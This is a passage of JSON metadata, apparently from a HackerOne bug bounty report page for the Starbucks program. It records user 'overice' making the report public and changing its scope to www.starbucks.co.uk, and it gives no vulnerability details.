ivities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-22T21:50:20.374Z","updated_at":"2018-05-22T21:50:20.374Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3694521,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-21T19:55:47.534Z","updated_at":"2018-11-21T19:55:47.534Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"www.starbucks.co.uk","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}